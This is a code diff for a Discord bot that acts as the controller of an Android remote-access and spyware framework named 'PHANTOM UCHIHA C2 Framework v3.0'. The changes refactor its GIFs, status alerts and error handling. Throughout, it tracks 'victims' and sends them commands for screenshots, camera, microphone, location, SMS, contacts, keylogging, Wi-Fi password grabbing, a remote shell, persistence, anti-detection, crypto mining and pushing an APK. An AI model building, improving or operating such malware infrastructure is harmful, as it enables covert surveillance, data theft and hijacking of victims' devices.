@@ -16,7 +16,45 @@ const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBit
 // ── GIFs ────────────────────────────────────────────────────────────────────
 
 const GIFS = fs.readFileSync(new URL('gif.txt', import.meta.url), 'utf8').split('\n').filter(Boolean).map(l => l.trim())
-function randGif() { const pool = [...GIFS, ...EMBED_GIFS]; return pool.length ? pool[Math.floor(Math.random() * pool.length)] : null }
+const ALL_GIFS = [...GIFS, ...EMBED_GIFS]
+
+function randGif() { return ALL_GIFS.length ? ALL_GIFS[Math.floor(Math.random() * ALL_GIFS.length)] : null }
+
+const GIF_CATEGORIES = {
+  online: [
+    'https://media.giphy.com/media/3o7TKSjRrfIPjeiVyM/giphy.gif',
+    'https://media.giphy.com/media/3o7abKhP8W5YnfLhBu/giphy.gif',
+    'https://media.giphy.com/media/xT9IgzoKnwFNmISR8I/giphy.gif',
+    'https://media.giphy.com/media/LmNwrBhejkK9EFn504/giphy.gif',
+    'https://media.giphy.com/media/l0HlvtIPzPdt2usKs/giphy.gif',
+  ],
+  offline: [
+    'https://media.giphy.com/media/g9582DNu1px0U/giphy.gif',
+    'https://media.giphy.com/media/26ufdipQqU2lhNA4g/giphy.gif',
+    'https://media.giphy.com/media/l3q2XhfQ8oCkm1Ts4/giphy.gif',
+    'https://media.giphy.com/media/3o6ozvv5zsJskyzxin/giphy.gif',
+    'https://media.giphy.com/media/l4q8cJzGdR9J8w3hS/giphy.gif',
+  ],
+  success: [
+    'https://media.giphy.com/media/3o7TKh6RqAC6mFLnFa/giphy.gif',
+    'https://media.giphy.com/media/l0MYGb8LuZ3n7d9OQ/giphy.gif',
+    'https://media.giphy.com/media/3o6gDPXMNxFhvHdcfK/giphy.gif',
+  ],
+  error: [
+    'https://media.giphy.com/media/3o7bu3XilJ5BOiSGic/giphy.gif',
+    'https://media.giphy.com/media/xT0xeJpnrWC4XWblEk/giphy.gif',
+    'https://media.giphy.com/media/3o6ozoLh4VXPmCT0G4/giphy.gif',
+  ],
+  menu: GIFS.slice(0, 5),
+  help: GIFS.slice(5, 10),
+  devices: GIFS.slice(10, 15),
+}
+
+function gifForCategory(cat) {
+  const pool = GIF_CATEGORIES[cat] || ALL_GIFS
+  if (!pool || !pool.length) return randGif()
+  return pool[Math.floor(Math.random() * pool.length)]
+}
 
 // ── Theme ────────────────────────────────────────────────────────────────────
 
@@ -44,8 +82,12 @@ const E = {
   check: '✅', cross: '❌', warning2: '⚠️', info: 'ℹ️',
   arrow: '➡️', up: '⬆️', down: '⬇️', left: '⬅️',
   online: '🟢', offline: '🔴', loading: '⏳', sparkles: '✨',
-  rocket: '🚀', pulse: '💫', ring: '💍', hourglass: '⏳',
+  rocket: '🚀', pulse: '💫', ring: '💍', hourglass: '⏱️',
 }
+
+// ── ANSI (must be before functions that use it) ────────────────────────────
+
+const A = { reset: '\u001b[0m', grey: '\u001b[90m', red: '\u001b[31m', cyan: '\u001b[36m', green: '\u001b[32m', yellow: '\u001b[33m', magenta: '\u001b[35m', brightRed: '\u001b[91m', brightCyan: '\u001b[96m' }
 
 // ── Fonts ──────────────────────────────────────────────────────────────────
 
@@ -92,75 +134,10 @@ function createBox(content, style = 'neon', width = 42) {
   return r
 }
 
-function drip(text) {
-  const d = ['̷', '̴', '̲', '̳', '̩', '̻', '̍', '̎', '̏', '̐']
-  return text.split('').map((c, i) => (i % 3 === 0) ? c + d[Math.floor(Math.random() * d.length)] : c).join('')
-}
-
-function glitch(text) {
-  const g = ['▓', '▒', '░', '█', '💀', '🔪', '☠']
-  return text.split('').map(c => Math.random() > 0.9 ? g[Math.floor(Math.random() * g.length)] : c).join('')
-}
-
-function rainbowText(text) {
-  const colors = ['\u001b[31m', '\u001b[33m', '\u001b[32m', '\u001b[36m', '\u001b[34m', '\u001b[35m', '\u001b[91m', '\u001b[95m']
-  return text.split('').map((c, i) => colors[i % colors.length] + c).join('') + A.reset
-}
-
-function waveText(text) {
-  const wave = ['̇', '̄', '̅', '̆']
-  return text.split('').map((c, i) => c + wave[i % wave.length]).join('')
-}
-
-function creepText(text) {
-  const c = ['̖', '̗', '̘', '̙', '̚', '̛', '̜', '̝', '̞', '̟']
-  return text.split('').map((x, i) => x + c[Math.floor(Math.random() * c.length)]).join('')
-}
-
-function zalgo(text) {
-  const z = ['\u0300', '\u0301', '\u0302', '\u0303', '\u0304', '\u0305', '\u0306', '\u0307', '\u0308', '\u0309', '\u030a', '\u030b', '\u030c', '\u030d', '\u030e', '\u030f', '\u0310', '\u0311', '\u0312', '\u0313', '\u0314', '\u0315', '\u0316', '\u0317', '\u0318', '\u0319', '\u031a', '\u031b', '\u031c', '\u031d', '\u031e', '\u031f', '\u0320', '\u0321', '\u0322', '\u0323', '\u0324', '\u0325', '\u0326', '\u0327', '\u0328', '\u0329', '\u032a', '\u032b', '\u032c', '\u032d', '\u032e', '\u032f', '\u0330', '\u0331', '\u0332', '\u0333', '\u0339', '\u033a', '\u033b', '\u033c', '\u0345', '\u0347', '\u0348', '\u0349', '\u034d', '\u034e', '\u0353', '\u0354', '\u0355', '\u0356', '\u0359', '\u035a', '\u0323']
-  return text.split('').map(x => x + z[Math.floor(Math.random() * 8)]).join('')
-}
-
-function randomColor() {
-  return Math.floor(Math.random() * 16777215)
-}
-
-const rainbowColors = [0xFF0000, 0xFF7F00, 0xFFFF00, 0x00FF00, 0x0000FF, 0x4B0082, 0x9400D3]
-function randRainbow() { return rainbowColors[Math.floor(Math.random() * rainbowColors.length)] }
-
 function barAnim(current, total, length = 10) {
   const fill = Math.round((current / total) * length)
   const empty = length - fill
   return '█'.repeat(fill) + '░'.repeat(empty)
-}
-
-const BANNERS = {
-  phantom: [
-    '╔══════════════════════════════════════╗',
-    '║   👁️ PHANTOM UCHIHA 👁️               ║',
-    '║   ████████████████████████████████   ║',
-    '║   █ C2 FRAMEWORK v3.0 █               ║',
-    '╚══════════════════════════════════════╝',
-  ],
-  uchiwa: [
-    '┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓',
-    '┃ 👁️‍🗨️ UCHIWA CLAN 👁️‍🗨️                  ┃',
-    '┃ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ┃',
-    '┃ 🔥 FIRE STYLE ACTIVE 🔥             ┃',
-    '┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛',
-  ],
-  sharingan: [
-    '╭──────────────────────────────────────╮',
-    '│ 👁️ SHARINGAN ACTIVATED 👁️             │',
-    '│ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ │',
-    '│ 🎯 TARGET LOCKED                     │',
-    '╰──────────────────────────────────────╯',
-  ],
-}
-
-function banner(name) {
-  return BANNERS[name] ? BANNERS[name].join('\n') : BANNERS.phantom.join('\n')
 }
 
 // ── Clock ──────────────────────────────────────────────────────────────────
@@ -174,10 +151,6 @@ function clockText() {
   const s = String(d.getSeconds()).padStart(2,'0')
   return `${days[d.getDay()]} ${d.getDate()} ${months[d.getMonth()]} ${d.getFullYear()}  ${h}:${m}:${s}`
 }
-
-// ── ANSI ──────────────────────────────────────────────────────────────────
-
-const A = { reset: '\u001b[0m', grey: '\u001b[90m', red: '\u001b[31m', cyan: '\u001b[36m', green: '\u001b[32m', yellow: '\u001b[33m', magenta: '\u001b[35m', brightRed: '\u001b[91m', brightCyan: '\u001b[96m' }
 
 // ── Buttons ────────────────────────────────────────────────────────────────
 
@@ -255,7 +228,7 @@ const alertCooldown = new Map()
 
 // ── Allowed command list for broadcast ─────────────────────────────────────
 
-const DEV_CMDS = [
+const DEV_CMDS = new Set([
   'ping', 'info', 'screenshot', 'camera', 'location', 'contacts', 'sms', 'call_log',
   'mic', 'clipboard', 'persist', 'shell', 'keylog', 'status', 'debug', 'restart',
   'wifi', 'battery', 'processes', 'installed', 'torch', 'vibrate', 'uptime', 'notifications',
@@ -263,7 +236,7 @@ const DEV_CMDS = [
   'update', 'config', 'grabber',
   'wifipass', 'netstat', 'sysinfo', 'antidetect', 'sysprop', 'services', 'apps', 'storage',
   'miner', 'upload',
-]
+])
 
 const BOT_CMDS = ['!help', '!menu', '!devices', '!broadcast', '!target', '!untarget', '!history', '!search', '!miner', '!upload', '!stream']
 
@@ -345,17 +318,6 @@ async function sendToTarget(uid, guild, cmd, payload) {
   return sendCmd(ch, cmd, payload)
 }
 
-function devSelect(channels) {
-  const arr = [...channels.values()]
-  if (arr.length > 25) return null
-  return [new ActionRowBuilder().addComponents(
-    new StringSelectMenuBuilder()
-      .setCustomId('sel')
-      .setPlaceholder('Select victim...')
-      .addOptions(arr.map(ch => new StringSelectMenuOptionBuilder().setLabel(ch.name).setDescription(`ID: ${ch.id}`).setValue(ch.id))))
-  ]
-}
-
 function devSelectPages(channels) {
   const arr = [...channels.values()]
   const pages = []
@@ -413,7 +375,7 @@ function buildDevicePages(guild) {
     const t = Math.ceil(sorted.length / 5)
     const { embeds } = bloodEmbed(bold(`${E.sharingan} VICTIMS: ${sorted.length}`), onlineCount > 0 ? 'online' : 'offline',
       `\`\`\`ansi\n${body}\n\`\`\``,
-      { footer: `${smallCaps('page')} ${p}/${t} ${E.rocket} ${onlineCount}/${sorted.length} alive`, thumb: randGif() })
+      { footer: `${smallCaps('page')} ${p}/${t} ${E.rocket} ${onlineCount}/${sorted.length} alive`, thumb: gifForCategory('devices') })
     const comps = sorted.length > 5 ? [...paginationRow(), ...MENU_BTNS] : MENU_BTNS
     pages.push({ embeds, components: comps })
   }
@@ -428,12 +390,14 @@ async function getAlertChannel() {
 }
 
 function bloodEmbed(title, status, desc, opts = {}) {
+  const thumb = opts.thumb || randGif()
+  const image = opts.image || randGif()
   const e = new EmbedBuilder()
     .setColor(ST_COL[status] || C.sharingan)
     .setTitle(title)
     .setDescription(desc)
-    .setThumbnail(opts.thumb || randGif())
-    .setImage(opts.image || randGif())
+    .setThumbnail(thumb)
+    .setImage(image)
     .setFooter({ text: opts.footer || `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, iconURL: ICONS.footer })
   if (opts.fields) e.addFields(opts.fields)
   return { embeds: [e] }
@@ -441,12 +405,12 @@ function bloodEmbed(title, status, desc, opts = {}) {
 
 function menuEmbed() {
   const clk = clockText()
-  const total = [...deviceStatus.values()].filter(s => s.online).length
+  const total = [...deviceStatus.values()].filter(s => s.online === true).length
   const totalDevices = deviceStatus.size
   const offlineCount = totalDevices - total
   return bloodEmbed(bold(`${E.sharingan} PHANTOM UCHIHA ${E.sharingan}`), 'info',
     `**${E.flame} C2 Framework v3.0**\n${clk}\n\n` +
-    `**${E.ghost} ${totalDevices} device(s)** — ${E.green} ${total} online${E.reset} | ${E.grey} ${offlineCount} offline${E.reset}\n\n` +
+    `**${E.ghost} ${totalDevices} device(s)** — ${total} online | ${offlineCount} offline\n\n` +
     `**${E.eye} Quick Commands**\n` +
     `• \`!devices\` — List all victims\n` +
     `• \`!target <name>\` — Select victim\n` +
@@ -460,7 +424,7 @@ function menuEmbed() {
     `• \`/menu\` \`/help\` \`/devices\` \`/target\`\n` +
     `• \`/broadcast\` \`/send\` \`/grabber\` \`/miner\` \`/upload\`\n\n` +
     `**${total > 0 ? `${E.knife} Ready — select a victim to begin` : `${E.coffin} Waiting for devices...`}**`,
-    { footer: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, thumb: randGif() })
+    { footer: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, thumb: gifForCategory('menu') })
 }
 
 function helpEmbed() {
@@ -497,8 +461,8 @@ function helpEmbed() {
     .setColor(C.sharingan)
     .setTitle(`${E.sharingan} PHANTOM UCHIHA — COMMAND REFERENCE`)
     .setDescription(`\`\`\`ansi\n${box}\n\`\`\``)
-    .setThumbnail(randGif())
-    .setImage(randGif())
+    .setThumbnail(gifForCategory('help'))
+    .setImage(gifForCategory('help'))
     .addFields(
       { name: `${E.zap} RECON`, value: '`!ping` `!info` `!status` `!ip` `!uptime` `!debug` `!restart`', inline: true },
       { name: `${E.eye} SURVEILLANCE`, value: '`!screenshot` `!camera` `!mic` `!location` `!clipboard` `!keylog` `!stream`', inline: true },
@@ -620,7 +584,7 @@ client.on(Events.InteractionCreate, async (i) => {
           for (const ch of matches) {
             const st = deviceStatus.get(ch.id)
             const on = st?.online ?? false
-            const dot = on ? '🟢' : '🔴'
+            const dot = on ? E.online : E.offline
             lines.push(`${A.cyan}┃${A.reset} ${dot} ${mono(ch.name)}`)
           }
           const box = createBox(lines.join('\n'), 'neon', 36)
@@ -751,7 +715,7 @@ client.on(Events.InteractionCreate, async (i) => {
 
     const uid = i.user.id, guild = i.guild
     if (!guild) return
-    if (isRateLimited(uid)) return i.reply({ content: `${E.skull} Rate limited. Wait.`, ephemeral: true }).catch(() => {})
+    if (isRateLimited(uid)) return i.reply({ content: `${E.skull} Rate limited. Wait a moment.`, ephemeral: true }).catch(() => {})
 
     // ── Defer immediately to prevent "interaction failed" ──
     if (!i.deferred && !i.replied) await i.deferUpdate().catch(() => {})
@@ -797,8 +761,11 @@ client.on(Events.InteractionCreate, async (i) => {
       const ch = guild.channels.cache.get(chId)
       if (!ch) return i.editReply({ content: `${E.coffin} Device channel not found ${E.skull}`, ephemeral: true }).catch(() => {})
       const actualCmd = ALERT_CMD_MAP[cmdKey] || cmdKey
-      await sendCmd(ch, actualCmd)
-      return i.editReply({ content: `${E.knife} \`!${actualCmd}\` sent ${E.skull}`, components: RESULT_BTNS, ephemeral: true }).catch(() => {})
+      const result = await sendCmd(ch, actualCmd)
+      if (result.ok) {
+        return i.editReply({ content: `${E.knife} \`!${actualCmd}\` sent ${E.skull}`, components: RESULT_BTNS, ephemeral: true }).catch(() => {})
+      }
+      return i.editReply({ content: `${E.coffin} Failed: ${result.err} ${E.skull}`, ephemeral: true }).catch(() => {})
     }
 
     // ── Navigation buttons ──
@@ -820,7 +787,7 @@ client.on(Events.InteractionCreate, async (i) => {
     }
     if (i.customId === 'menu') { const m = menuEmbed(); return i.followUp({ ...m, components: MENU_BTNS, ephemeral: true }).catch(() => {}) }
     if (i.customId === 'help') { const h = helpEmbed(); return i.followUp({ ...h, components: HELP_BTNS, ephemeral: true }).catch(() => {}) }
-    if (i.customId === 'info') { return i.followUp({ content: `${E.bone} **PHANTOM C2 v3.0**\n${E.zap} Discord WebSocket Gateway\n${E.heart} Heartbeat: 4-7 min\n${E.target} Commands: ${DEV_CMDS.length}\n${E.ghost} Max victims: unlimited`, ephemeral: true }).catch(() => {}) }
+    if (i.customId === 'info') { return i.followUp({ content: `${E.bone} **PHANTOM UCHIHA v3.0**\n${E.zap} Discord WebSocket Gateway\n${E.heart} Heartbeat: 4-7 min\n${E.target} Commands: ${DEV_CMDS.size}\n${E.ghost} Max victims: unlimited`, ephemeral: true }).catch(() => {}) }
     if (i.customId === 'broadcast') return i.followUp({ content: `${E.bomb} \`!broadcast <cmd>\` sends to ALL devices ${E.skull}`, ephemeral: true }).catch(() => {})
 
     // ── Target button ──
@@ -859,7 +826,7 @@ client.on(Events.InteractionCreate, async (i) => {
       const pages = devSelectPages(channels)
       if (!pages.length) return i.editReply({ content: `${E.warning} ${channels.size} devices. Use \`!${BTN_ACTIONS[i.customId]} <name>\` ${E.skull}` }).catch(() => {})
       if (!i.channel) return i.editReply({ content: `${E.coffin} Cannot create selector ${E.skull}` }).catch(() => {})
-      const m = await i.editReply({ content: `Select victim for \`!${BTN_ACTIONS[i.customId]}\` ${E.knife}`, components: pages[0].components }).catch(() => {})
+      const m = await i.editReply({ content: `Select victim for \`!${BTN_ACTIONS[i.customId]}\` ${E.knife}`, components: pages[0].components }).catch(() => null)
       if (!m) return
       if (pages.length > 1) {
         devicePages.set(m.id, { pages, idx: 0, ts: Date.now() })
@@ -867,7 +834,10 @@ client.on(Events.InteractionCreate, async (i) => {
       const col = i.channel.createMessageComponentCollector({ filter: si => si.user.id === uid && si.customId === 'sel' && si.message.id === m.id, time: SELECT_TIMEOUT, max: 1 })
       col.on('collect', async si => {
         const ch = guild.channels.cache.get(si.values[0])
-        if (ch) { await sendCmd(ch, BTN_ACTIONS[i.customId]); targets.set(uid, { chId: ch.id, ts: Date.now() }) }
+        if (ch) {
+          const result = await sendCmd(ch, BTN_ACTIONS[i.customId])
+          if (result.ok) targets.set(uid, { chId: ch.id, ts: Date.now() })
+        }
         await si.update({ content: `${E.knife} \`!${BTN_ACTIONS[i.customId]}\` sent ${E.skull}`, components: [] }).catch(() => {})
       })
       col.on('end', async collected => { if (!collected.size) try { await m.edit({ content: `${E.coffin} Timed out ${E.skull}`, components: [] }) } catch (_) {} })
@@ -963,7 +933,7 @@ client.on(Events.MessageCreate, async (msg) => {
           for (const ch of matches) {
             const st = deviceStatus.get(ch.id)
             const on = st?.online ?? false
-            const dot = on ? '🟢' : '🔴'
+            const dot = on ? E.online : E.offline
             lines.push(`${A.cyan}┃${A.reset} ${dot} ${mono(ch.name)}`)
           }
           const box = createBox(lines.join('\n'), 'neon', 36)
@@ -1056,15 +1026,16 @@ client.on(Events.MessageCreate, async (msg) => {
     }
 
     const clean = cmdL.replace(/^!/, '')
-    if (!DEV_CMDS.includes(clean)) return
+    if (!DEV_CMDS.has(clean)) return
 
     await guild.channels.fetch()
     const channels = getPhantomChannels(guild)
 
     if (clean === 'ping' && !channels.size && !targets.has(uid)) {
       const start = Date.now()
-      const m = await msg.reply(`${E.heart} Pong! ${E.skull}`)
-      return m.edit(`${E.heart} Pong! Bot latency: **${Date.now() - start}ms** | ${E.coffin} No devices ${E.skull}`)
+      const m = await msg.reply(`${E.heart} Pong! ${E.skull}`).catch(() => null)
+      if (!m) return
+      return m.edit(`${E.heart} Pong! Bot latency: **${Date.now() - start}ms** | ${E.coffin} No devices ${E.skull}`).catch(() => {})
     }
 
     let payload = args.join(' '), deviceCh = null
@@ -1078,7 +1049,10 @@ client.on(Events.MessageCreate, async (msg) => {
       const size = formatSize(apk.size)
       const ver = apk.name.match(/v?(\d+\.\d+\.\d+)/)?.[1] || 'unknown'
       const cmdPayload = `push ${url}`
-      const r = deviceCh ? await sendCmd(deviceCh, clean, cmdPayload) : targets.has(uid) ? await sendToTarget(uid, guild, clean, cmdPayload) : channels.size === 1 ? await sendCmd(channels.first(), clean, cmdPayload) : null
+      let r = null
+      if (deviceCh) r = await sendCmd(deviceCh, clean, cmdPayload)
+      else if (targets.has(uid)) r = await sendToTarget(uid, guild, clean, cmdPayload)
+      else if (channels.size === 1) r = await sendCmd(channels.first(), clean, cmdPayload)
       if (!r || !r.ok) return msg.reply(`${E.coffin} No target. Use \`!target <name>\` first ${E.skull}`)
       return msg.reply({ content: `${E.knife} Pushing \`openaccess-v${ver}.apk\` (${size}) to \`${r.name}\` ${E.skull}`, components: RESULT_BTNS })
     }
@@ -1106,7 +1080,8 @@ client.on(Events.MessageCreate, async (msg) => {
     if (channels.size > 1) {
       const pages = devSelectPages(channels)
       if (!pages.length) return msg.reply(`${E.warning} ${channels.size} devices. Use \`!${clean} <name>\` ${E.skull}`)
-      const m = await msg.reply({ content: `Select victim for \`!${clean}\` ${E.knife}`, components: pages[0].components })
+      const m = await msg.reply({ content: `Select victim for \`!${clean}\` ${E.knife}`, components: pages[0].components }).catch(() => null)
+      if (!m) return
       if (pages.length > 1) {
         devicePages.set(m.id, { pages, idx: 0, ts: Date.now() })
       }
@@ -1141,9 +1116,9 @@ async function refreshDeviceStatus(guild, sendAlerts = false) {
       try {
         const msgs = await ch.messages.fetch({ limit: 25 })
         for (const [, m] of msgs) {
-          const isHeartbeat = m.content.includes('🟢') || m.content.includes(':heartbeat:') || /<:heartbeat:\d+>/.test(m.content)
-          const isGreenCircle = m.content.includes('🟢') || m.content.includes(':green_circle:') || /<:green_circle:\d+>/.test(m.content)
-          if ((isHeartbeat || isGreenCircle) && Date.now() - m.createdTimestamp < HEARTBEAT_TIMEOUT) {
+          if (!m.content) continue
+          const isHeartbeat = m.content.includes('🟢') || m.content.includes(':heartbeat:') || /<:heartbeat:\d+>/.test(m.content) || m.content.includes(':green_circle:') || /<:green_circle:\d+>/.test(m.content)
+          if (isHeartbeat && Date.now() - m.createdTimestamp < HEARTBEAT_TIMEOUT) {
             online = true; lastSeen = m.createdTimestamp; break
           }
         }
@@ -1163,7 +1138,8 @@ async function refreshDeviceStatus(guild, sendAlerts = false) {
       alertCooldown.set(cooldownKey, Date.now())
       let mModel = ch.name.replace('phantom-', ''), mAndroid = '?', mIp = '?'
       try {
-        for (const [, m] of await ch.messages.fetch({ limit: 25 })) {
+        for (const [, m] of msgs) {
+          if (!m.content) continue
           const om = m.content.match(/\*\*Device Online\*\* — (.+?) \((.+?)\) \| IP: (.+)/)
           if (om) { mModel = om[1]; mAndroid = om[2]; mIp = om[3]; break }
           const hm = m.content.match(/\*\*Alive\*\* — (.+?) \| IP: (.+)/)
@@ -1193,8 +1169,10 @@ async function refreshDeviceStatus(guild, sendAlerts = false) {
         ]
         e.setColor(C.void)
           .setTitle(`${E.coffin} ${ch.name} EXSANGUINATED ${E.coffin}`)
+          .setThumbnail(gifForCategory('offline'))
+          .setImage(`attachment://status-${deviceName}.png`)
           .addFields(fields)
-          .setFooter({ text: '𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐎𝐩𝐞𝐧𝐀𝐜𝐜𝐞𝐬𝐬 𝐁𝐨𝐭', iconURL: ICONS.alert })
+          .setFooter({ text: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, iconURL: ICONS.alert })
         await alertCh.send({ embeds: [e], files: [attachment], components: ALERT_BTNS_OFFLINE(ch.id) }).catch(err => console.error('Alert send (offline):', err.message))
       } else {
         const fields = [
@@ -1207,8 +1185,10 @@ async function refreshDeviceStatus(guild, sendAlerts = false) {
         ]
         e.setColor(C.neon)
           .setTitle(`${E.chain} ${ch.name} REANIMATED ${E.chain}`)
+          .setThumbnail(gifForCategory('online'))
+          .setImage(`attachment://status-${deviceName}.png`)
           .addFields(fields)
-          .setFooter({ text: '𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐎𝐩𝐞𝐧𝐀𝐜𝐜𝐞𝐬𝐬 𝐁𝐨𝐭', iconURL: ICONS.correct })
+          .setFooter({ text: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, iconURL: ICONS.correct })
         await alertCh.send({ embeds: [e], files: [attachment], components: ALERT_BTNS_ONLINE(ch.id) }).catch(err => console.error('Alert send (online):', err.message))
       }
     }
@@ -1218,28 +1198,39 @@ async function refreshDeviceStatus(guild, sendAlerts = false) {
 
 function startStatusChecker(guild) {
   if (statusCheckerId) clearInterval(statusCheckerId)
-  refreshDeviceStatus(guild, true)
-  statusCheckerId = setInterval(async () => {
-    await refreshDeviceStatus(guild, true)
-    const total = [...deviceStatus.values()].filter(s => s.online).length
+  let running = false
+  const runCheck = async () => {
+    if (running) return
+    running = true
     try {
-      await client.user.setActivity(`👁️ Watching ${total} devices | !help`, { type: 3 })
+      await refreshDeviceStatus(guild, true)
+const total = [...deviceStatus.values()].filter(s => s.online === true).length
+      await client.user.setActivity(`👁️ Watching ${total} devices | !help`, { type: 3 }).catch(() => {})
     } catch (_) {}
-  }, STATUS_CHECK_INTERVAL)
+    finally { running = false }
+  }
+  runCheck()
+  statusCheckerId = setInterval(runCheck, STATUS_CHECK_INTERVAL)
 }
 
 // ── Map cleanup (memory leak fix) ─────────────────────────────────────────
 
 function cleanupMaps() {
   const now = Date.now()
+  const toDeleteTargets = []
   for (const [uid, data] of targets) {
     const chId = typeof data === 'string' ? data : data.chId
     const ts = typeof data === 'object' ? data.ts : now
-    if (now - ts > 3600000 || !client.channels.cache.has(chId)) targets.delete(uid)
+    if (!chId || now - ts > 3600000) toDeleteTargets.push(uid)
+    else if (client.channels.cache.size > 0 && !client.channels.cache.has(chId)) toDeleteTargets.push(uid)
   }
+  for (const uid of toDeleteTargets) targets.delete(uid)
+
+  const toDeleteStatus = []
   for (const [chId, st] of deviceStatus) {
-    if (!client.channels.cache.has(chId) && st.lastSeen && now - st.lastSeen > 3600000) deviceStatus.delete(chId)
+    if (!client.channels.cache.has(chId) && st.lastSeen && now - st.lastSeen > 3600000) toDeleteStatus.push(chId)
   }
+  for (const chId of toDeleteStatus) deviceStatus.delete(chId)
   for (const [id, page] of devicePages) {
     if (now - page.ts > PAGINATION_TIMEOUT) devicePages.delete(id)
   }
@@ -1284,8 +1275,8 @@ client.once(Events.ClientReady, async () => {
         .setColor(C.sharingan)
         .setTitle(`${E.sharingan} ${bold('PHANTOM UCHIHA')}`)
         .setDescription(lines.join('\n'))
-        .setThumbnail(randGif())
-        .setImage(randGif())
+        .setThumbnail(gifForCategory('success'))
+        .setImage(gifForCategory('success'))
         .setFooter({ text: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, iconURL: ICONS.footer })
       await ch.send({ embeds: [e], components: MENU_BTNS }).catch(err => console.error('Startup:', err.message))
     }
